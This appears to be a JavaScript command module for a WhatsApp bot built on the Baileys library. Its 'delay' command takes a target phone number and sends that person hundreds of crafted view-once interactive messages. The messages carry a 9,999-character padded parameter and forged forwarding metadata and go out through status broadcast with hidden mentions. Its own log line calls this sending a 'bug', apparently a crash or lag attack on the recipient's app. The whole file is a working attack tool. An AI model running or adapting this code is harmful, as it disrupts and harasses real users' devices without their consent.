import '../config.js';
import {
  proto,
  downloadContentFromMessage,
  jidNormalizedUser,
  generateWAMessageFromContent
} from "baileys";

export const command = ["delayy", "delay"]

export default async (m, {
  reply, pushname, qriz, q, isOwner, riz
}) => {
  if (!isOwner) reply(mess.owner);
  if (!q) return reply('*contoh*: .delayy 62xxx');

  let jidx = q.replace(/[^0-9]/g, "");

  if (jidx.startsWith('0')) {
    return reply(`The number starts with '0'. Replace it with the country code number.\n\nExample: .delayy 62 xxx-xxxx-xxxx`);
  }

  let target = `${jidx}@s.whatsapp.net`;

  reply(`*Success! sent to ${target}*`)

  for (let r = 0; r < 100; r++) {
    await delaymention(riz, target)
    await delaymention(riz, target)
    await delaymention(riz, target)
    await delaymention(riz, target)
    await delaymention(riz, target)
  }

  console.log(chalk.red.bold("Sukses Ngirim Bug!"))

  async function delaymention(riz, target) {
  
    let msg = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "RIZZ",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "ꦽ".repeat(9999),
                        version: 3
                    },
                   entryPointConversionSource: "galaxy_message",
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    });
    for (let i = 0; i < 300; i++) {
  const janda = generateWAMessageFromContent(target, msg, {});

        
        await riz.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                { tag: "to", attrs: { jid: target }, content: undefined }
                            ]
                        }
                    ]
                }
            ]
        });
        if (i < 99) {
            await new Promise(resolve => setTimeout(resolve, 5000));
        }
    }
}
}